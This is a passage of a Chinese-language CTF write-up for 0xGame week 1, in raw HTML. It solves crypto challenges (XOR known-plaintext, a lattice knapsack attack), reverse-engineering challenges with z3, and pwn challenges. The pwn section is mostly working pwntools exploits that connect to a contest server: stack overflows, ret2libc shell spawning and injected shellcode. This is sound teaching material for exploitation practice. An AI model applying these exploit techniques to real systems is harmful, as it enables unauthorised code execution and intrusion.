class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">text</span>):</span><br><span class="line">    text = text.decode()</span><br><span class="line">    code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">    unpad = <span class="number">0</span></span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (text[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &amp; (text[-<span class="number">2</span>:] != <span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">        text = text[:-<span class="number">1</span>]</span><br><span class="line">        unpad = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> text[-<span class="number">2</span>:] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">        text = text[:-<span class="number">2</span>]</span><br><span class="line">        unpad = -<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(code.index(i)))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line">    tmp = tmp[:unpad]</span><br><span class="line">    result = long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=&#x27;</span></span><br><span class="line">c = dec(c)</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#求key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>(<span class="params">flag</span>):</span><br><span class="line">    key=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    result=<span class="string">b&#x27;0xGame&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        key+=((flag[i]^(result[i]+i))).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">key = getkey(c)</span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        a = (key[i%<span class="number">7</span>]^(enc[i]))-i</span><br><span class="line">        result += a.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">flag = decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Kn0wn_pl@intext_Att@ck!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Take-my-bag"><a href="#Take-my-bag" class="headerlink" title="Take my bag!"></a>Take my bag!</h2><p>源码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">enc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">enc += init[i] * <span class="built_in">int</span>(m[i]) % n</span><br><span class="line"><span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">w = getPrime(<span class="number">64</span>)</span><br><span class="line">n = getPrime(<span class="number">512</span>)</span><br><span class="line">init = [w*<span class="built_in">pow</span>(<span class="number">3</span>, i) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;w=<span class="subst">&#123;w&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">w=16221818045491479713</span></span><br><span class="line"><span class="string">n=9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061</span></span><br><span class="line"><span class="string">c=4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>背包密码。</p><p>参考：</p><ol><li><a href="https://blog.csdn.net/m0_62506844/article/details/125795366">https://blog.csdn.net/m0_62506844/article/details/125795366</a></li><li><a href="https://blog.csdn.net/sorryagain/article/details/125067778">https://blog.csdn.net/sorryagain/article/details/125067778</a></li></ol><p>解题脚本（sage）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, bytes_to_long, inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w=<span class="number">16221818045491479713</span></span><br><span class="line">n=<span class="number">9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061</span></span><br><span class="line">c=<span class="number">4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111</span></span><br><span class="line">pubkey=[w*<span class="built_in">pow</span>(<span class="number">3</span>, i) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"><span class="comment">#print(len(pubkey))</span></span><br><span class="line"><span class="comment">#272</span></span><br><span class="line">nbit=<span class="number">512</span></span><br><span class="line"><span class="comment">#随机找一个符合条件的N</span></span><br><span class="line">N=nextprime(gmpy2.iroot(nbit,<span class="number">2</span>)[<span class="number">0</span>]//<span class="number">2</span>)</span><br><span class="line">L=Matrix(QQ,nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="comment">#构造矩阵L</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,nbit]=pubkey[i]*N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[nbit,i]=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">L[nbit,nbit]=c*N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL start&quot;</span>)</span><br><span class="line">res=L.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>)):</span><br><span class="line">    <span class="comment"># print solution</span></span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]<span class="comment">#最后面密文恢复后变成0</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">1</span>/<span class="number">2</span> <span class="keyword">and</span> m != -<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#根据破解原理，恢复的明文应只包含-1/2和1/2</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        mm=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (i, M)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> M:</span><br><span class="line">            <span class="keyword">if</span> j==-<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#不确定-1/2和1/2哪个代表二进制1</span></span><br><span class="line">                mm+=<span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mm+=<span class="string">&quot;0&quot;</span></span><br><span class="line">flag=mm[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Welc0me_2_Crypt0_G@me!#$&amp;%&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="数字筑基"><a href="#数字筑基" class="headerlink" title="数字筑基"></a>数字筑基</h2><p>ida32打开即可在main函数看到flag。</p><p><img src="/0xGame-week1/r_1_1.png"></p><h2 id="代码金丹"><a href="#代码金丹" class="headerlink" title="代码金丹"></a>代码金丹</h2><p>同样ida32打开在main函数看到flag。</p><p><img src="/0xGame-week1/r_2_1.png"></p><h2 id="网络元婴"><a href="#网络元婴" class="headerlink" title="网络元婴"></a>网络元婴</h2><p>ida64打开在main函数看到flag。</p><p><img src="/0xGame-week1/r_3_1.png"></p><h2 id="虚拟化神"><a href="#虚拟化神" class="headerlink" title="虚拟化神"></a>虚拟化神</h2><p>先运行一次程序，会生成一个<code>config.txt</code>的文件，修改<code>config.txt</code>的<code>0</code>为<code>1</code>，再运行一次即可得到flag。</p><h2 id="赛博天尊"><a href="#赛博天尊" class="headerlink" title="赛博天尊"></a>赛博天尊</h2><p>ida64打开，查看main函数。</p><p><img src="/0xGame-week1/r_5_1.png"></p><p>很显然需要用z3来解方程。</p><p>先安装z3。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pip install z3_solver</span><br></pre></td></tr></table></figure><p>之后就写脚本解方程，将得到的结果拼接起来，得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v7, v8, v9, v10, v11 = Ints(<span class="string">&#x27;v7 v8 v9 v10 v11&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">7</span> * v9 + <span class="number">5</span> * (v8 + v11) + <span class="number">2</span> * (v10 + <span class="number">4</span> * v7) == <span class="number">0x12021DE669FC2</span>)</span><br><span class="line">s.add(v8 + <span class="number">2</span> * (v9 + v10 + <span class="number">2</span> * v10 + <span class="number">2</span> * (v11 + v7)) + (v9 + v10 + <span class="number">2</span> * v10 + <span class="number">2</span> * (v11 + v7)) == <span class="number">0x159BFFC17D045</span>)</span><br><span class="line">s.add(v10 + v9 + v11 + <span class="number">2</span> * v9 + <span class="number">2</span> * (v9 + v11 + <span class="number">2</span> * v9) + <span class="number">2</span> * (v8 + <span class="number">4</span> * v7) == <span class="number">0xACE320D12501</span>)</span><br><span class="line">s.add(v8 + <span class="number">2</span> * (v7 + v11 + v9 + <span class="number">2</span> * v10) == <span class="number">0x733FFEB3A4FA</span>)</span><br><span class="line">s.add(v8 + <span class="number">7</span> * v11 + <span class="number">8</span> * (v9 + v10) + <span class="number">5</span> * v7 == <span class="number">0x1935EBA54EB28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[v11 = 63356652901730,</span></span><br><span class="line"><span class="string"> v7 = 2693650760,</span></span><br><span class="line"><span class="string"> v10 = 41791,</span></span><br><span class="line"><span class="string"> v9 = 16488,</span></span><br><span class="line"><span class="string"> v8 = 14810]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">v11 = <span class="number">63356652901730</span></span><br><span class="line">v7 = <span class="number">2693650760</span></span><br><span class="line">v10 = <span class="number">41791</span></span><br><span class="line">v9 = <span class="number">16488</span></span><br><span class="line">v8 = <span class="number">14810</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;0xGame&#123;&quot;</span>+<span class="built_in">hex</span>(v7)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v8)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v9)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v10)[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(v11)[<span class="number">2</span>:]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#0xGame&#123;a08dd948-39da-4068-a33f-399f5eca5562&#125;</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="找不到且不对劲的flag"><a href="#找不到且不对劲的flag" class="headerlink" title="找不到且不对劲的flag"></a>找不到且不对劲的flag</h2><p>nc 连接，然后<code>ls -la</code>，可以看到有一个<code>.secret</code>的文件夹，flag就在那个文件夹里。</p><h2 id="永远进不去的后门"><a href="#永远进不去的后门" class="headerlink" title="永远进不去的后门"></a>永远进不去的后门</h2><p>简单的栈溢出，找到后门的地址直接跳过去就行了。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51002</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x401298</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Tell me sth interesting, and I will give you what you want.\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="随便乱搞的shellcode"><a href="#随便乱搞的shellcode" class="headerlink" title="随便乱搞的shellcode"></a>随便乱搞的shellcode</h2><p><img src="/0xGame-week1/p_1_1.png"></p><p>没有后门函数，程序会将<code>buf[rand()%256]</code>的部分当成代码执行，因此我们需要控制shellcode在这里。</p><p>有<code>close(1);</code>，所以要来上一个<code>exec 1&gt;&amp;0</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#cal =  process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">cal = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51003</span>)</span><br><span class="line">elf = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">elf.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">off = elf.rand()</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(off%<span class="number">256</span>) + sc</span><br><span class="line">cal.sendlineafter(<span class="string">b&quot;code:&quot;</span>,payload)</span><br><span class="line">cal.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cal.interactive()</span><br></pre></td></tr></table></figure><p><img src="/0xGame-week1/p_1_2.png"></p><h2 id="我后门呢？"><a href="#我后门呢？" class="headerlink" title="我后门呢？"></a>我后门呢？</h2><p>参考链接：</p><ol><li><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">https://blog.csdn.net/weixin_45943522/article/details/120469196</a></li><li><a href="https://blog.csdn.net/Mintind/article/details/128165311">https://blog.csdn.net/Mintind/article/details/128165311</a></li><li><a href="https://libc.blukat.me/">https://libc.blukat.me/</a></li></ol><p>用<code>ROPgadget</code>找<code>rid</code>和<code>ret</code>的地址。</p><p><img src="/0xGame-week1/p_2_2.png"></p><p>泄露出<code>puts</code>的地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51005</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401333</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())  <span class="comment">#p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># 0x7f79a6363420</span></span><br></pre></td></tr></table></figure><p>然后用 <code>libc database search</code> 找 <code>system</code> 和 <code>/bin/sh</code> 的地址。</p><p><img src="/0xGame-week1/p_2_1.png"></p><p>最后用<code>puts</code>算出基地址，在第二次栈溢出时<code>getshell</code>。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51005</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401333</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">7</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())  <span class="comment">#p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>-<span class="number">1</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="高端的syscall"><a href="#高端的syscall" class="headerlink" title="高端的syscall"></a>高端的syscall</h2><p>同样拿<code>ret2libc</code>打的。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2syscall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.130.35.16&#x27;</span>, <span class="number">51004</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4012e3</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: \n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input: \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="字符串和随机数"><a href="#字符串和随机数" class="headerlink" title="字符串和随机数"></a>字符串和随机数</h2><p><img src="/0xGame-week1/p_3_1.png"></p><ol><li>通过将<code>name</code>填充满，把<code>seed</code>泄露出来。</li><li><code>pass</code>需要以<code>\x00</code>结尾。</li><li>泄露出<code>seed</code>后要先把<code>seed</code>逆序，再转成10进制数。（踩到的坑）</li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;8.130.35.16&#x27;, 51001)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name: &#x27;</span>,<span class="string">&quot;adminaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Password: &#x27;</span>,<span class="string">&quot;1s_7h1s_p9ss_7tuIy_sAf3?\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome back, adminaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span>)</span><br><span class="line">a = p.recv(<span class="number">4</span>)[::-<span class="number">1</span>]</span><br><span class="line">seed = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">aa = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(aa)==<span class="number">1</span>:</span><br><span class="line">aa=<span class="string">&#x27;0&#x27;</span>+aa</span><br><span class="line">seed +=aa</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line">seed = <span class="built_in">int</span>(seed,<span class="number">16</span>)</span><br><span class="line">elf.srand(seed)</span><br><span class="line">v3 = elf.rand() </span><br><span class="line">v2 = elf.rand() </span><br><span class="line">v3 = v3 ^ <span class="number">0xD0E0A0D0</span></span><br><span class="line">v2 = v2 ^ <span class="number">0xB0E0E0F</span></span><br><span class="line">v1 = (v3^v2)%<span class="number">0xF4240</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Wanna see it?&#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;continue: &#x27;</span>,<span class="built_in">str</span>(v1))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="got-it"><a href="#got-it" class="headerlink" title="got-it"></a>got-it</h2><p>数组溢出修改got表。</p><p><img src="/0xGame-week1/p_4_1.png"></p><p><img src="/0xGame-week1/p_4_2.png"></p><p><img src="/0xGame-week1/p_4_3.png"></p><p><img 